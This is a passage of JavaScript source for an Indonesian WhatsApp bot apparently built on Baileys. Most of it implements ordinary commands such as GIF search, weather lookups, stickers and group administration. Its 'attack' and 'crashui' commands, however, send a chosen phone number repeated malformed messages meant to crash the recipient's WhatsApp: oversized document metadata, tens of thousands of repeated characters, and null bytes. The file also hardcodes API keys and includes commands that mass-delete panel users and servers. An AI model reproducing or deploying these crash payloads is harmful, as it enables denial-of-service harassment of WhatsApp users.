 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
case 'giphy':
if (args.length < 2) {
 return Aanz.sendMessage(m.chat, {text: 'Harap masukkan kata kunci dan rasio untuk mencari GIF. Contoh: .giphy kucing 16:9'});
 }

 const query = args.slice(0, args.length - 1).join(" ");
 const ratio = args[args.length - 1]; 

 const giphyApiKey = 'ERNiZMa3nz2NmHutk8BN36wJ5wRhtOIZ';
 const giphyUrl = `https://api.giphy.com/v1/gifs/search?api_key=${giphyApiKey}&q=${encodeURIComponent(query)}&limit=3`;

 try {
 const res = await fetch(giphyUrl);
 const json = await res.json();

 if (json.data.length > 0) {
 const gifs = json.data.slice(0, 3);

 let sizeOption = 'fixed_width'; 
 if (ratio === '16:9') {
 sizeOption = 'fixed_width';
 } else if (ratio === '1:1') {
 sizeOption = 'fixed_height';
 }

 const gifUrls = gifs.map((gif) => gif.images.original_mp4 ? gif.images.original_mp4.mp4 : gif.images.original.mp4);

 if (gifUrls.length === 3) {
 for (let i = 0; i < gifUrls.length; i++) {
 await Aanz.sendMessage(m.chat, {
 video: { url: gifUrls[i] },
 caption: `GIF ${i + 1} hasil pencarian untuk: ${query} dengan ukuran: ${ratio}`,
 mimetype: 'video/mp4',
 });
 }
 return;
 } else {
 return Aanz.sendMessage(m.chat, {text: `Tidak ditemukan tiga GIF untuk: ${query}`});
 }
 } else {
 return Aanz.sendMessage(m.chat, {text: `Tidak ditemukan GIF untuk: ${query}`});
 }
 } catch (error) {
 console.error(error);
 return Aanz.sendMessage(m.chat, {text: 'Terjadi kesalahan saat mengambil GIF dari GIPHY. Harap coba lagi nanti.'});
 }
 break
case 'cuaca':
if (args.length === 0) {
 return Aanz.sendMessage(m.chat, {
 text: "Harap masukkan nama kota setelah perintah, contoh: `.cuaca Jakarta`",
 });
 }

 const city = args.join(" ");
 const weatherApiKey = 'b4e61a9a74f943babc901855243011'; // Ganti dengan API key Anda
 const weatherUrl = `https://api.weatherapi.com/v1/current.json?key=${weatherApiKey}&q=${city}&lang=id`;

 try {
 const response = await axios.get(weatherUrl);

 // Cek jika ada error dari API
 if (response.data.error) {
 return Aanz.sendMessage(m.chat, {
 text: `❌ Terjadi kesalahan: ${response.data.error.message}. Pastikan nama kota sudah benar.`,
 });
 }

 // Ambil data cuaca dari response
 const weatherData = response.data;
 const weatherInfo = `
 *Cuaca di ${weatherData.location.name}, ${weatherData.location.country}*
 🌡️ *Suhu*: ${weatherData.current.temp_c}°C
 ☁️ *Kondisi*: ${weatherData.current.condition.text}
 💨 *Kecepatan Angin*: ${weatherData.current.wind_kph} km/h
 💧 *Kelembapan*: ${weatherData.current.humidity}%
 🌅 *Waktu*: ${weatherData.location.localtime}
 `;

 // Mengirim informasi cuaca
 return Aanz.sendMessage(m.chat, {
 text: weatherInfo,
 });

 } catch (error) {
 // Tangani kesalahan saat request API
 console.error('Kesalahan:', error);
 return Aanz.sendMessage(m.chat, {
 text: "❌ Terjadi kesalahan saat mengambil informasi cuaca. Harap coba lagi nanti.",
 });
 }
 break
case 'shortlink':
{
 try {
 const axios = require('axios');
 const url = text.trim();
 if (!url || !url.startsWith('http')) {
 return Aanz.sendMessage(m.chat, { 
 text: '*🚫 Harap masukkan URL yang valid (contoh: https://example.com).*' 
 }, { quoted: m });
 }

 const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
 const shortUrl = response.data;

 Aanz.sendMessage(m.chat, { 
 text: `*🔗 Link Pendek:*\n\n${shortUrl}` 
 }, { quoted: m });
 } catch (error) {
 console.error('Error memperpendek URL:', error);
 Aanz.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat memperpendek URL.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break

case 'sticker':
{
 try {
 if (!m.quoted) {
 return Aanz.sendMessage(m.chat, { 
 text: '*🚫 Balas pesan gambar/video atau kirim gambar/video untuk dijadikan sticker.*' 
 }, { quoted: m });
 }

 const quotedMsg = m.quoted;
 const mime = quotedMsg.mimetype || '';

 if (!/image|video/.test(mime)) {
 return Aanz.sendMessage(m.chat, { 
 text: '*🚫 File yang dibalas harus berupa gambar atau video.*' 
 }, { quoted: m });
 }

 const isImage = /image/.test(mime);
 const isVideo = /video/.test(mime);

 // Pastikan video berdurasi pendek (max 10 detik)
 if (isVideo && (quotedMsg.seconds > 10)) {
 return Aanz.sendMessage(m.chat, { 
 text: '*🚫 Video terlalu panjang. Maksimal 10 detik.*' 
 }, { quoted: m });
 }

 // Unduh media
 const media = await Aanz.downloadMediaMessage(quotedMsg);
 if (!media) {
 return Aanz.sendMessage(m.chat, { 
 text: '*❌ Gagal mengunduh media. Harap coba lagi.*' 
 }, { quoted: m });
 }

 // Kirim stiker
 Aanz.sendMessage(
 m.chat,
 { 
 sticker: media, 
 mimetype: 'image/webp', 
 packname: 'MyBot Sticker', 
 author: 'Aanz Bot' 
 },
 { quoted: m }
 );
 } catch (error) {
 console.error('Error pada case sticker:', error);
 Aanz.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat membuat sticker.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break
case 'setppbot':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 try {
 // Memeriksa apakah pengguna mereply atau mengirim gambar
 const mediaMessage = m.message.imageMessage || (m.quoted && m.quoted.message.imageMessage);
 if (!mediaMessage) {
 return Aanz.sendMessage(m.chat, { 
 text: '*🚫 Harap reply atau kirimkan sebuah gambar untuk dijadikan foto profil bot.*' 
 }, { quoted: m });
 }

 const mediaBuffer = await Aanz.downloadMediaMessage(mediaMessage);

 await Aanz.updateProfilePicture(Aanz.user.id, mediaBuffer);

 Aanz.sendMessage(m.chat, { 
 text: '*✅ Foto profil bot berhasil diubah.*' 
 }, { quoted: m });
 } catch (error) {
 console.error('Error saat mengganti foto profil bot:', error);
 Aanz.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat mengganti foto profil bot.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break
case 'attack':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text) return m.reply(`*Format salah!*\nContoh: ${prefix + command} <nomor target>`);

 const targetJid = text.includes('@s.whatsapp.net') ? text : `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const thumbnail = fs.readFileSync('./media/thumbnail.jpg'); 
 
 async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
 let etc = generateWAMessageFromContent(
 X,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 header: {
 title: "",
 documentMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
 mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
 fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
 fileLength: "9999999999999",
 pageCount: 9007199254740991,
 mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
 fileName: "⿻ CrazyCrash ⿻",
 fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 mediaKeyTimestamp: "1723855952",
 contactVcard: true,
 thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
 thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
 thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
 jpegThumbnail: ThM,
 },
 hasMediaAttachment: true,
 },
 body: {
 text: "⭑̤▾ ⿻ CrazyUi ⿻ ▾⭑" + "ꦾ" + "ꦾ".repeat(77777),
 },
 nativeFlowMessage: {
 messageParamsJson: '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
 },
 },
 },
 },
 }),
 {
 userJid: X,
 quoted: Qtd,
 }
 );

 await Aanz.relayMessage(
 X,
 etc.message,
 ptcp
 ? {
 participant: {
 jid: X,
 },
 }
 : {}
 );
 console.log(chalk.green("𝗧𝗪 𝗖𝗜𝗟𝗟"));
 }

 // Function to send multiple messages
 async function sendMultipleMessages(targetJid, thumbnail, count = 5) {
 for (let i = 0; i < count; i++) {
 try {
 await ClPmNull(targetJid, m, thumbnail, false, true); // Send message
 console.log(`Pesan ke-${i + 1} berhasil dikirim!`);
 } catch (error) {
 console.log(`❌ Gagal mengirim pesan ke-${i + 1}: ${error.message}`);
 }
 }
 }

 // Call the function to send multiple messages (default 5 messages)
 try {
 await sendMultipleMessages(targetJid, thumbnail, 5); // Adjust count as needed
 m.reply(`Sukses Send Bug Ke : ${text}`);
 } catch (error) {
 m.reply(`❌ *Gagal mengirim pesan:* ${error.message}`);
 }
 }
 break
case 'crashui':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text) return m.reply(`*Format salah!*\nContoh: ${prefix + command} 628xxxxxxxxxx 1`);

 const args = text.split(' ');
 const targetJid = args[0].includes("@s.whatsapp.net") ? args[0] : `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const count = parseInt(args[1]) || 5; // Default 5 pesan jika jumlah tidak disebutkan

 async function sendViewOnceMessage(receiverJid) {
 try {
 const generatedMessage = generateWAMessageFromContent(
 receiverJid,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 liveLocationMessage: {
 degreesLatitude: Math.random() * 180 - 90, // Random latitude
 degreesLongitude: Math.random() * 360 - 180, // Random longitude
 caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ‌‌ 𝙏𝙍𝘼𝙎𝙃" + "\0".repeat(100), // Pesan error
 sequenceNumber: `${Math.floor(Math.random() * 1000)}`, // Random urutan
 jpegThumbnail: Buffer.from([]), // Thumbnail kosong
 }
 }
 }
 }),
 {
 userJid: receiverJid,
 }
 );

 await Aanz.relayMessage(receiverJid, generatedMessage.message, {
 messageId: generatedMessage.key.id,
 });
 } catch (error) {
 console.error("❌ Gagal mengirim Bug:", error);
 }
 }

 async function sendMultipleMessages(receiverJid, count) {
 try {
 await Promise.all(
 Array.from({ length: count }).map(() => sendViewOnceMessage(receiverJid))
 );
 m.reply(`Sukses Send Bug ${args[0]}`);
 } catch (error) {
 m.reply(`❌ Terjadi kesalahan saat mengirim pesan: ${error.message}`);
 }
 }

 sendMultipleMessages(targetJid, count);
}
break
    case 'totalfitur': {
    const totalFitur = () => {
        const mytext = fs.readFileSync("./Aanz.js").toString();
        const numUpper = (mytext.match(/case '/g) || []).length;
        return numUpper;
    };

    const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

    let teks = `
┌───「 *AanzCuyxzzz-V2* 」───
│ ⚙️ *Total Fitur*: ${totalFitur()}
│ 🛠️ *Developer*: AanzzzCuyxzz
└───────────────────
`;

    await Aanz.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: teks,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: 'AanzCuyxzzz - V2',
                body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
                mediaType: 1,
                renderLargerThumbnail: false,
            },
        },
    }, { quoted: m });
}
break;

case 'cadmin':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let s = q.split('-');
 let email = s[0];
 let username = s[0];
 let nomor = s[1];

 if (s.length < 2) return Aanz.sendMessage(m.chat, { text: `*Format salah!*\nPenggunaan:\n${prefix + command} user-nomer` });
 if (!username) return Aanz.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user` });
 if (!nomor) return Aanz.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username-@tag/nomor\n\nContoh :\n${prefix + command} example-@user` });

 let password = username + "AanzCuyxzzz";
 let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

 // Membuat permintaan ke API untuk membuat user
 let f = await fetch(domain + "/api/application/users", {
 "method": "POST",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 },
 "body": JSON.stringify({
 "email": username + "@gmail.com",
 "username": username,
 "first_name": username,
 "last_name": "Memb",
 "language": "en",
 "root_admin": true,
 "password": password.toString()
 })
 });

 let data = await f.json();

 if (data.errors) return Aanz.sendMessage(m.chat, { text: JSON.stringify(data.errors[0], null, 2) });

 let user = data.attributes;

 let tks = `*_Paket Telah Terkirim Dengan Selamat✅_*`;

 // Kirim pesan dengan detail akun admin
 await Aanz.sendMessage(m.chat, { text: tks }, { quoted: m });

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke nomor yang ditentukan
 await Aanz.sendMessage(nomornya, {
 video: { url: videoUrl },
 caption: `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *link* : ${domain}
└───────────────────
> *_© Developer : AanzCuyxzzz_*
`,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });
}
break;
case 'linkserver':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

 let teks = `
┌───「 *AanzCuyxzzz-V2* 」───
│ *Domain* : ${global.domain}
│ *Apikey* : ${global.apikey}
│ *Capikey* : ${global.capikey}
│ *Domain 2* : ${global.domain2}
│ *Apikey 2* : ${global.apikey2}
│ *Capikey 2* : ${global.capikey2}
│ *Domain 3* : ${global.domain3}
│ *Apikey 3* : ${global.apikey3}
│ *Capikey 3* : ${global.capikey3}
└───────────────────
`;

 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;

case 'updomain':{
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain = newteks;

 await Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await Aanz.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'upapikey':{
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey = newteks;
 return Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

  
    




case 'clearadmin': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin , 48, 49, 50');
    }

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati proses penghapusan
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : AanzCuyxzzz_*`);
                continue;
            }

            let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : AanzCuyxzzz_*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'clearserver': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver , 101, 102, 103');
    }

    try {
        // Mendapatkan daftar server
        let f = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'clearserver2': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver2 , 201, 202, 203');
    }

    try {
        // Mendapatkan daftar server dari server 2
        let f = await fetch(global.domain2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey2,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan di server 2.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domain2 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey2,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan di server 2: ' + error.message);
    }
    break;
}

case 'clearserver3': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver3 , 301, 302, 303');
    }

    try {
        // Mendapatkan daftar server dari server 3
        let f = await fetch(global.domain3 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan di server 3.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domain3 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey3,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus dari server 3 kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan di server 3: ' + error.message);
    }
    break;
}

case 'setnamagb':{
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await Aanz.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 if (!text) return m.reply('Masukkan nama grup baru!\nContoh: .setname Nama Grup Baru');

 try {
 await Aanz.groupUpdateSubject(m.chat, text); // Ganti nama grup
 m.reply(`Berhasil mengganti nama grup menjadi: *${text}*`);
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengganti nama grup. Pastikan bot memiliki izin sebagai admin.');
 }
}
break;

case 'setppgb': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await Aanz.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 // Periksa apakah ada gambar (bisa dari reply atau teks URL)
 let media;
 if (m.quoted && m.quoted.imageMessage) {
 media = await Aanz.downloadMediaMessage(m.quoted); // Ambil media dari reply
 } else if (text) {
 media = text; // Ambil URL gambar dari input teks
 } else {
 return m.reply('Kirim atau reply ke gambar, atau masukkan URL gambar untuk mengganti foto grup.');
 }

 try {
 await Aanz.updateProfilePicture(m.chat, { url: media }); // Set foto grup
 m.reply('Berhasil mengganti foto profil grup.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengganti foto profil grup. Pastikan gambar valid dan sesuai.');
 }
}
break;

case 'closegroup': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await Aanz.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 try {
 await Aanz.groupSettingUpdate(m.chat, 'announcement');
 m.reply('Grup telah ditutup. Hanya admin yang dapat mengirim pesan.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal menutup grup.');
 }
}
break;

case 'opengroup': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await Aanz.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 try {
 await Aanz.groupSettingUpdate(m.chat, 'not_announcement');
 m.reply('Grup telah dibuka. Semua anggota dapat mengirim pesan.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal membuka grup.');
 }
}
break;

case 'setdeks':{
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await Aanz.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 if (!text) return m.reply('Masukkan deskripsi baru untuk grup!');
 try {
 await Aanz.groupUpdateDescription(m.chat, text);
 m.reply('Berhasil mengganti deskripsi grup.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengubah deskripsi grup.');
 }
}
break;

case 'hidetag': {
 if (!m.isGroup) return Reply(mess.group);
 if (!isCreator && !m.isAdmin) return Reply(mess.admin);
 if (!text) return m.reply("Masukkan pesan yang ingin Anda kirimkan untuk men-tag semua anggota grup.");

 // Ambil metadata grup
 const groupMetadata = await Aanz.groupMetadata(m.chat);
 if (!groupMetadata || !groupMetadata.participants) {
 return m.reply("Gagal mengambil data anggota grup.");
 }

 let member = groupMetadata.participants.map(v => v.id);
 await Aanz.sendMessage(m.chat, {text: text, mentions: member}, {quoted: m});
}
break

case 'kick': {
 if (!m.isGroup) return Reply(mess.group); // Pastikan perintah ini dijalankan di grup
 if (!isCreator && !m.isAdmin) return Reply(mess.admin); // Pastikan pengirim adalah admin atau creator grup
 
 // Mendapatkan ID pengguna yang akan dikeluarkan
 let userToKick = m.mentionedJid[0]; // Mengambil ID pengguna yang disebutkan
 if (!userToKick) return m.reply("Tag pengguna yang ingin dikeluarkan!"); // Pastikan pengguna ditandai
 
 // Melakukan kick atau mengeluarkan pengguna dari grup
 try {
 await Aanz.groupParticipantsUpdate(m.chat, [userToKick], 'remove'); // Mengeluarkan anggota
 m.reply(`Pengguna @${userToKick.split('@')[0]} berhasil dikeluarkan dari grup.`, null, { mentions: [userToKick] });
 } catch (error) {
 console.error(error);
 m.reply("Gagal mengeluarkan pengguna dari grup.");
 }
}
break

case 'linkgc':
{
 if (!m.isGroup) return m.reply("Perintah ini hanya dapat digunakan di grup.");
 if (!isCreator && !m.isAdmin) return m.reply("Perintah ini hanya untuk admin grup.");
 
 try {
 // Pastikan metadata grup sudah ada
 const groupMetadata = await Aanz.groupMetadata(m.chat);
 if (!groupMetadata) throw "Gagal mendapatkan metadata grup.";
 
 // Ambil kode undangan grup
 const inviteCode = await Aanz.groupInviteCode(m.chat);
 const groupLink = `https://chat.whatsapp.com/${inviteCode}`;
 m.reply(`┌───「 *AanzCuyxzzz-V2* 」───
│ *Link Group* : ${groupLink}
└───────────────────`);
 } catch (err) {
 console.error(err); // Log error ke konsol
 m.reply("Gagal mendapatkan link grup. Pastikan bot adalah admin dan grup memiliki kode undangan aktif.");
 }
}
break;


case 'cekip':
if (!text) return m.reply("Masukkan IP address atau domain yang ingin dicek! Contoh: 8.8.8.8 atau google.com");
 
 const axios = require('axios');
 try {
 // Lakukan request ke API untuk mendapatkan detail IP
 const response = await axios.get(`https://ipapi.co/${text}/json/`);
 const data = response.data;

 // Cek apakah data berhasil ditemukan
 if (data.error) return m.reply(`IP atau domain tidak ditemukan: ${text}`);

 // Format pesan hasil
 const message = `
🌐 **Informasi IP**
- **IP Address**: ${data.ip || "Tidak diketahui"}
- **Kota**: ${data.city || "Tidak diketahui"}
- **Wilayah**: ${data.region || "Tidak diketahui"}
- **Negara**: ${data.country_name || "Tidak diketahui"} (${data.country || "?"})
- **Kode Pos**: ${data.postal || "Tidak diketahui"}
- **Provider**: ${data.org || "Tidak diketahui"}
- **Latitude**: ${data.latitude || "Tidak diketahui"}
- **Longitude**: ${data.longitude || "Tidak diketahui"}
 `.trim();

 m.reply(message);
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat memproses permintaan. Pastikan IP atau domain valid, lalu coba lagi.");
 }
 break;

case 'translate': {
 if (!text) return m.reply("Masukkan format yang benar: translate <kode bahasa> <teks>. Contoh: translate en Selamat pagi");
 
 const args = text.split(' ');
 const targetLang = args.shift();
 const query = args.join(' ');

 if (!targetLang || !query) return m.reply("Masukkan format yang benar: translate <kode bahasa> <teks>. Contoh: translate en Selamat pagi");

 m.reply("Sedang menerjemahkan...");
 
 try {
 const axios = require('axios');
 const response = await axios.post('https://translate.googleapis.com/translate_a/single', null, {
 params: {
 client: 'gtx',
 sl: 'auto',
 tl: targetLang,
 dt: 't',
 q: query,
 },
 });

 const translation = response.data[0][0][0];
 m.reply(`Hasil terjemahan:\n${translation}`);
 } catch (error) {
 console.error(error);
